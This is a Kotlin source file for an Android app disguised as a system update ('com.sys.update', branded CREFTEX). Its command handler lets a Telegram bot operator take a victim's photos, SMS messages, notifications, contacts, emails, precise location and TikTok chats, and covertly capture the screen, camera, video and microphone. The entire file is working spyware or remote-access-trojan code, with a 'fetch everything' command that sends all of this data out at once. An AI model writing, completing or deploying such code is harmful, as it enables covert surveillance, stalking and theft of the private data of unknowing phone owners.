package com.sys.update

import android.content.Context
import android.util.Log
import org.json.JSONObject
import java.io.File

object CommandExecutor {

    private val runningJobs = java.util.concurrent.ConcurrentHashMap<String, Boolean>()

    @Volatile
    var screenLoopActive: Boolean = false
        private set

    @Volatile
    var accessibilityServiceRef: android.accessibilityservice.AccessibilityService? = null

    fun handle(ctx: Context, callbackData: String, callbackId: String) {
        TelegramApi.answerCallback(callbackId)
        Log.d("CmdExec", "callback: $callbackData")

        when {
            callbackData == "menu" -> showMainMenu(ctx)
            callbackData == "photos_all" -> fetchAllPhotos(ctx)
            callbackData == "photos_50" -> fetchLastPhotos(ctx, 50)
            callbackData == "photos_200" -> fetchLastPhotos(ctx, 200)
            callbackData == "sms_all" -> fetchAllSms(ctx)
            callbackData == "notifs_all" -> fetchAllNotifs(ctx)
            callbackData == "accessibility_log" -> fetchAccessibility(ctx)
            callbackData == "audio_start" -> startAudio(ctx)
            callbackData == "audio_stop" -> stopAudio(ctx)
            callbackData == "screen_once" -> captureOnce(ctx)
            callbackData == "screen_loop_start" -> startScreenLoop(ctx)
            callbackData == "screen_loop_stop" -> stopScreenLoop(ctx)
            callbackData.startsWith("stop_") -> stopJob(ctx, callbackData.removePrefix("stop_"))
            else -> TelegramApi.sendMessage("❓ أمر غير معروف", KeyboardBuilder.backToMenu())
        }
    }

    /**
     * ⭐ معالج النصوص — يستقبل أزرار Reply Keyboard
     */
    fun handleText(ctx: Context, text: String) {
        val cmd = text.trim()
        Log.d("CmdExec", "text cmd: $cmd")

        when {
            // الترحيب / البداية
            cmd == "/start" || cmd == "/menu" || cmd == "🏠 القائمة" -> showMainMenu(ctx)

            // الصور
            cmd == "📸 كل الصور" || cmd == "/photos" -> fetchAllPhotos(ctx)
            cmd == "📸 آخر 50" -> fetchLastPhotos(ctx, 50)
            cmd == "📸 آخر 200" -> fetchLastPhotos(ctx, 200)

            // الرسائل
            cmd == "📩 كل الرسائل" || cmd == "/sms" -> fetchAllSms(ctx)

            // الإشعارات
            cmd == "🔔 الإشعارات" || cmd == "/notifs" -> fetchAllNotifs(ctx)

            // ⭐ جهات الاتصال
            cmd == "👥 جهات الاتصال" || cmd == "/contacts" -> fetchContacts(ctx)

            // ⭐ الإيميلات
            cmd == "📧 الإيميلات" || cmd == "/emails" -> fetchEmails(ctx)

            // معلومات الجهاز
            cmd == "📊 معلومات الجهاز" || cmd == "/info" -> showDeviceInfo(ctx)

            // الموقع
            cmd == "📍 الموقع" || cmd == "/location" -> showLocation(ctx)

            // تيك توك
            cmd == "🎵 تيك توك" || cmd == "/tiktok" -> tiktokOpen(ctx)
            cmd == "/tiktok_messages" -> tiktokRead(ctx)
            cmd == "/tiktok_read" -> tiktokRead(ctx)

            // جلب شامل
            cmd == "🚀 جلب كل شي" || cmd == "/all" -> fetchEverything(ctx)

            // الأوامر القديمة (للتوافق)
            cmd == "/audio_start" -> startAudio(ctx)
            cmd == "/audio_stop" -> stopAudio(ctx)
            cmd == "/screen" -> captureOnce(ctx)
            cmd == "/screen_loop" -> startScreenLoop(ctx)
            cmd == "/screen_stop" -> stopScreenLoop(ctx)
            cmd == "/accessibility" || cmd == "/acc" -> fetchAccessibility(ctx)
            cmd == "/cam_front" -> captureCamera(ctx, true)
            cmd == "/cam_back" -> captureCamera(ctx, false)
            cmd == "/video" || cmd == "/video30" -> recordVideo(ctx, 30)

            // /photos N
            cmd.startsWith("/photos") -> {
                val n = cmd.removePrefix("/photos").trim().toIntOrNull() ?: 50
                fetchLastPhotos(ctx, n)
            }

            else -> {
                TelegramApi.sendMessage(
                    "اكتب /menu أو اضغط زر من القائمة 👇",
                    KeyboardBuilder.replyKeyboard()
                )
            }
        }
    }

    // ═══════════════════════════════════════════
    //  CONTACTS & EMAILS — جديد
    // ═══════════════════════════════════════════
    private fun fetchContacts(ctx: Context) {
        runJob(ctx, "contacts") {
            TelegramApi.sendMessage("👥 *جاري قراءة جهات الاتصال...*")

            val contacts = ContactsHelper.getAllContacts(ctx)
            if (contacts.isEmpty()) {
                TelegramApi.sendMessage("📭 لا توجد جهات اتصال", KeyboardBuilder.replyKeyboard())
                return@runJob
            }

            val sb = StringBuilder()
            sb.append("👥 *جهات الاتصال* — ${contacts.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")

            var count = 0
            for (c in contacts) {
                sb.append("👤 *${c.name}*\n")
                if (c.phones.isNotEmpty()) {
                    sb.append("📞 ${c.phones.joinToString(" , ")}\n")
                }
                if (c.emails.isNotEmpty()) {
                    sb.append("📧 ${c.emails.joinToString(" , ")}\n")
                }
                sb.append("\n")
                count++

                if (sb.length > 3500) {
                    TelegramApi.sendMessage(sb.toString())
                    sb.clear()
                }
                if (count >= 100) {
                    sb.append("… +${contacts.size - count} آخرين\n")
                    break
                }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    private fun fetchEmails(ctx: Context) {
        runJob(ctx, "emails") {
            TelegramApi.sendMessage("📧 *جاري قراءة الإيميلات...*")

            val emails = ContactsHelper.getAllEmails(ctx)
            if (emails.isEmpty()) {
                TelegramApi.sendMessage("📭 لا توجد إيميلات", KeyboardBuilder.replyKeyboard())
                return@runJob
            }

            val sb = StringBuilder()
            sb.append("📧 *كل الإيميلات* — ${emails.size}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")

            for (e in emails) {
                sb.append("✉️ *${e.name}*\n")
                sb.append("`${e.email}`\n\n")

                if (sb.length > 3500) {
                    TelegramApi.sendMessage(sb.toString())
                    sb.clear()
                }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  TIKTOK
    // ═══════════════════════════════════════════
    private fun tiktokOpen(ctx: Context) {
        runJob(ctx, "tiktok_open") {
            if (accessibilityServiceRef == null) {
                TelegramApi.sendMessage(
                    "⚠️ *خدمة Accessibility غير نشطة*\n\n" +
                    "فعّلها من: الإعدادات → إمكانية الوصول → CREFTEX",
                    KeyboardBuilder.replyKeyboard()
                )
                return@runJob
            }
            TelegramApi.sendMessage("🎵 *جاري فتح تيك توك...*")
            val ok = TikTokController.openTikTok(ctx)
            if (ok) {
                TelegramApi.sendMessage(
                    "✅ تم فتح تيك توك\n\nافتح المحادثة التي تريدها، ثم اضغط (🎵 تيك توك) مرة أخرى للقراءة",
                    KeyboardBuilder.replyKeyboard()
                )
            } else {
                TelegramApi.sendMessage("❌ فشل فتح تيك توك", KeyboardBuilder.replyKeyboard())
            }
        }
    }

    private fun tiktokRead(ctx: Context) {
        runJob(ctx, "tiktok_read") {
            if (accessibilityServiceRef == null) {
                TelegramApi.sendMessage("⚠️ Accessibility غير نشط", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val fgPkg = TikTokController.getForegroundPackage(accessibilityServiceRef)
            if (fgPkg != "com.zhiliaoapp.musically" && fgPkg != "com.ss.android.ugc.trill") {
                TelegramApi.sendMessage("⚠️ افتح تيك توك أولًا", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val texts = TikTokController.readTikTokTexts(accessibilityServiceRef)
            if (texts.isNullOrEmpty()) {
                TelegramApi.sendMessage("❌ لا نصوص قابلة للقراءة", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val sb = StringBuilder()
            sb.append("🎵 *تيك توك*\n━━━━━━━━━━━━━━━━━━━━\n\n")
            var count = 0
            for (t in texts) {
                if (t.length < 3) continue
                sb.append("• $t\n")
                count++
                if (count >= 60) break
            }
            TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  SCREEN
    // ═══════════════════════════════════════════
    private fun captureOnce(ctx: Context) {
        if (!ScreenCapture.isReady) {
            TelegramApi.sendMessage("⚠️ صلاحية الشاشة غير جاهزة", KeyboardBuilder.replyKeyboard())
            return
        }
        runJob(ctx, "screen_once") {
            val file = ScreenCapture.capture(ctx)
            if (file != null && file.exists()) {
                TelegramApi.sendPhoto(file, "📷 لقطة شاشة")
                file.delete()
            } else {
                TelegramApi.sendMessage("❌ فشل", KeyboardBuilder.replyKeyboard())
            }
        }
    }

    private fun startScreenLoop(ctx: Context) {
        if (!ScreenCapture.isReady) {
            TelegramApi.sendMessage("⚠️ صلاحية الشاشة غير جاهزة", KeyboardBuilder.replyKeyboard())
            return
        }
        screenLoopActive = true
        TelegramApi.sendMessage("📷 ✅ بدأ اللقطات المتكررة كل 30 ثانية", KeyboardBuilder.replyKeyboard())
    }

    private fun stopScreenLoop(ctx: Context) {
        screenLoopActive = false
        TelegramApi.sendMessage("📷 ⏹ تم الإيقاف", KeyboardBuilder.replyKeyboard())
    }

    private fun recordVideo(ctx: Context, durationSec: Int) {
        if (!ScreenCapture.isReady) {
            TelegramApi.sendMessage("⚠️ صلاحية الشاشة غير جاهزة", KeyboardBuilder.replyKeyboard())
            return
        }
        runJob(ctx, "video") {
            TelegramApi.sendMessage("📹 *بدأ التسجيل ($durationSec ثانية)...*")
            val file = VideoRecorder.start(ctx, durationSec)
            if (file == null) {
                TelegramApi.sendMessage("❌ فشل البدء", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            Thread.sleep((durationSec + 3) * 1000L)
            val done = VideoRecorder.stop() ?: file
            if (done.exists() && done.length() > 0) {
                val sizeMB = done.length() / (1024.0 * 1024.0)
                TelegramApi.sendVideo(done, "📹 فيديو (${String.format("%.1f", sizeMB)} MB)")
                done.delete()
            }
            TelegramApi.sendMessage("✅ تم", KeyboardBuilder.replyKeyboard())
        }
    }

    private fun captureCamera(ctx: Context, front: Boolean) {
        runJob(ctx, "cam") {
            val label = if (front) "أمامية" else "خلفية"
            TelegramApi.sendMessage("📷 *جاري التصوير ($label)...*")
            val file = CameraCapture.capture(ctx, front, timeoutSec = 12)
            if (file != null && file.exists()) {
                TelegramApi.sendPhoto(file, "📷 صورة — ${DeviceInfo.getQuickInfo(ctx)}")
                file.delete()
            } else {
                TelegramApi.sendMessage("❌ فشل التصوير", KeyboardBuilder.replyKeyboard())
            }
        }
    }

    // ═══════════════════════════════════════════
    //  AUDIO
    // ═══════════════════════════════════════════
    private fun startAudio(ctx: Context) {
        if (AudioRecorder.isRunning()) {
            TelegramApi.sendMessage("🎤 شغّال بالفعل")
            return
        }
        AudioRecorder.startLoop(ctx)
        TelegramApi.sendMessage("🎤 ✅ بدأ التسجيل كل 10 ثواني", KeyboardBuilder.replyKeyboard())
    }

    private fun stopAudio(ctx: Context) {
        AudioRecorder.stopLoop(ctx)
        TelegramApi.sendMessage("🎤 ⏹ تم الإيقاف", KeyboardBuilder.replyKeyboard())
    }

    // ═══════════════════════════════════════════
    //  MENUS
    // ═══════════════════════════════════════════
    private fun showMainMenu(ctx: Context) {
        TelegramApi.sendMessage(
            "🎛 *لوحة التحكم — CREFTEX*\n\n" +
            "استخدم الأزرار أسفل الشاشة للتحكم 👇",
            KeyboardBuilder.replyKeyboard()
        )
    }

    private fun showDeviceInfo(ctx: Context) {
        val info = DeviceInfo.getFullInfo(ctx)
        TelegramApi.sendMessage(info, KeyboardBuilder.replyKeyboard())
    }

    private fun showLocation(ctx: Context) {
        runJob(ctx, "location") {
            TelegramApi.sendMessage("📍 *جاري تحديد الموقع...*")
            val loc = LocationHelper.getPreciseLocation(ctx)
            val text = LocationHelper.formatLocation(ctx, loc)
            TelegramApi.sendMessage(text, KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  PHOTOS
    // ═══════════════════════════════════════════
    private fun fetchAllPhotos(ctx: Context) {
        runJob(ctx, "photos_all") {
            val all = MediaScanner.scanImages(ctx)
            sendPhotosList(ctx, all, "📸 كل الصور (${all.size})")
        }
    }

    private fun fetchLastPhotos(ctx: Context, n: Int) {
        runJob(ctx, "photos_$n") {
            val all = MediaScanner.scanImages(ctx).take(n)
            sendPhotosList(ctx, all, "📸 آخر $n صورة")
        }
    }

    private fun sendPhotosList(ctx: Context, list: List<MediaScanner.MediaFile>, title: String) {
        if (list.isEmpty()) {
            TelegramApi.sendMessage("📸 لا توجد صور", KeyboardBuilder.replyKeyboard())
            return
        }
        val jobId = "photos_${System.currentTimeMillis()}"
        runningJobs[jobId] = true
        val statusMsgId = TelegramApi.sendMessage("$title\n⏳ 0/${list.size}", KeyboardBuilder.stopJob(jobId))
        var sent = 0
        var failed = 0
        val startTime = System.currentTimeMillis()
        for (item in list) {
            if (runningJobs[jobId] != true) break
            val file = File(item.path)
            if (!file.exists()) { failed++; continue }
            val ok = TelegramApi.sendPhoto(file, item.name)
            if (ok) sent++ else failed++
            if ((sent + failed) % 10 == 0) {
                val elapsed = (System.currentTimeMillis() - startTime) / 1000
                TelegramApi.editMessage(statusMsgId, "$title\n⏳ $sent/$failed\n⏱ ${elapsed}s", KeyboardBuilder.stopJob(jobId))
                Thread.sleep(500)
            }
        }
        runningJobs.remove(jobId)
        val elapsed = (System.currentTimeMillis() - startTime) / 1000
        TelegramApi.editMessage(statusMsgId, "$title\n✅ $sent\n❌ $failed\n⏱ ${elapsed}s", KeyboardBuilder.replyKeyboard())
    }

    // ═══════════════════════════════════════════
    //  SMS
    // ═══════════════════════════════════════════
    private fun fetchAllSms(ctx: Context) {
        runJob(ctx, "sms_all") {
            val inbox = SmsReader.scanAll(ctx)
            val sent = SmsReader.scanSent(ctx)
            val all = (inbox + sent).sortedByDescending { it.optString("date") }
            if (all.isEmpty()) {
                TelegramApi.sendMessage("📩 لا رسائل", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val grouped = all.groupBy { it.optString("address", "unknown") }
            val sb = StringBuilder()
            sb.append("📩 *SMS* — ${all.size}\n━━━━━━━━━━━━━━━━━━━━\n\n")
            for ((address, msgs) in grouped) {
                sb.append("📞 *$address* (${msgs.size})\n")
                for (m in msgs.take(5)) {
                    val type = if (m.optString("type") == "sms_sent") "📤" else "📥"
                    sb.append("  $type ${m.optString("body", "").take(80)}\n")
                }
                if (msgs.size > 5) sb.append("  … +${msgs.size - 5}\n")
                sb.append("\n")
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  NOTIFICATIONS
    // ═══════════════════════════════════════════
    private fun fetchAllNotifs(ctx: Context) {
        runJob(ctx, "notifs_all") {
            val lines = DataStore.readNotifications(ctx, limit = 5000)
            val notifs = lines.mapNotNull { line ->
                try { val obj = JSONObject(line); if (obj.optString("type") == "notif") obj else null }
                catch (_: Exception) { null }
            }
            if (notifs.isEmpty()) {
                TelegramApi.sendMessage("🔔 لا إشعارات", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val grouped = notifs.groupBy { it.optString("pkg", "unknown") }
            val sb = StringBuilder()
            sb.append("🔔 *الإشعارات* — ${notifs.size}\n━━━━━━━━━━━━━━━━━━━━\n\n")
            for ((pkg, items) in grouped) {
                sb.append("📱 *$pkg* (${items.size})\n")
                for (n in items.take(5)) {
                    val t = n.optString("title", "")
                    val tx = n.optString("text", "")
                    if (t.isNotBlank()) sb.append("  ▸ $t\n")
                    if (tx.isNotBlank()) sb.append("    $tx\n")
                }
                if (items.size > 5) sb.append("  … +${items.size - 5}\n")
                sb.append("\n")
                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
            }
            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  ACCESSIBILITY
    // ═══════════════════════════════════════════
    private fun fetchAccessibility(ctx: Context) {
        runJob(ctx, "accessibility") {
            if (!AccessibilityHelper.isEnabled(ctx)) {
                TelegramApi.sendMessage("⚠️ Accessibility غير مفعل", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val lines = AccessibilityHelper.readCapturedTexts(ctx, limit = 500)
            if (lines.isEmpty()) {
                TelegramApi.sendMessage("📝 لا نصوص", KeyboardBuilder.replyKeyboard())
                return@runJob
            }
            val sb = StringBuilder()
            sb.append("📝 *نصوص الشاشة* — ${lines.size}\n\n")
            var c = 0
            for (l in lines.takeLast(30)) {
                try {
                    val obj = JSONObject(l)
                    if (obj.optString("type") != "accessibility") continue
                    sb.append("📱 ${obj.optString("package")}\n")
                    sb.append("${obj.optString("texts")}\n\n")
                    c++
                } catch (_: Exception) {}
            }
            TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  FETCH ALL
    // ═══════════════════════════════════════════
    private fun fetchEverything(ctx: Context) {
        runJob(ctx, "all") {
            TelegramApi.sendMessage("🚀 *بدأ الجلب الشامل*")
            Thread.sleep(400)
            try { TelegramApi.sendMessage(DeviceInfo.getFullInfo(ctx)) } catch (_: Exception) {}
            Thread.sleep(400)
            try {
                val loc = LocationHelper.getPreciseLocation(ctx)
                TelegramApi.sendMessage(LocationHelper.formatLocation(ctx, loc))
            } catch (_: Exception) {}
            Thread.sleep(400)

            val photos = MediaScanner.scanImages(ctx).take(30)
            sendPhotosList(ctx, photos, "📸 الصور")

            Thread.sleep(400)
            fetchAllSms(ctx)
            Thread.sleep(400)
            fetchAllNotifs(ctx)
            Thread.sleep(400)
            fetchContacts(ctx)

            TelegramApi.sendMessage("✅ *اكتمل*", KeyboardBuilder.replyKeyboard())
        }
    }

    // ═══════════════════════════════════════════
    //  JOB
    // ═══════════════════════════════════════════
    private fun stopJob(ctx: Context, jobId: String) {
        runningJobs[jobId] = false
        runningJobs.remove(jobId)
        TelegramApi.sendMessage("🛑 تم الإيقاف", KeyboardBuilder.replyKeyboard())
    }

    private fun runJob(ctx: Context, jobName: String, block: () -> Unit) {
        Thread {
            try { block() } catch (e: Exception) {
                Log.e("CmdExec", "job $jobName err: ${e.message}")
                TelegramApi.sendMessage("❌ خطأ في $jobName: ${e.message}", KeyboardBuilder.replyKeyboard())
            }
        }.start()
    }
}
